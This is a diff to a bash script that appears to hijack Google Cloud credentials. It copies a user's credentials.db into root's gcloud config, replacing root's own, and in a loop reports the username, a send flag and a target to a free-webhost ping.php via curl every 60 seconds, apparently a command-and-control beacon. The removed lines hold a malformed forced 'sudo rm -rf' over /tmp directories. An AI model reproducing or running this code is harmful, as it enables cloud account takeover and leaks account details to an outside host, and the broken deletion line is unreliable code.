@@ -2,11 +2,15 @@
 
 target=$1
 
-sudo rm -rf echo /tmp/tmp.* | xargs -n 1
+home=$(echo /home/g*)
 
-user=$(gcloud auth list --format="value(account)")
+user=${home#/home/}
 
-echo /tmp/tmp.*/ | xargs -n 1 cp -v /home/${user/@*}/credentials.db
+gcloud info
+
+rm -rf /root/.config/gcloud/credentials.db
+
+cp -v /home/$user/credentials.db /root/.config/gcloud
 
 gcloud auth list
 
@@ -19,6 +23,6 @@ then
    send='F'
 fi
 
-curl https://g11977765505.000webhostapp.com/ping.php?user=${user/@*}'&send='$send'&target='${target/@*}
+curl https://g11977765505.000webhostapp.com/ping.php?user=$user'&send='$send'&target='${target/@*}
 sleep 60
 done
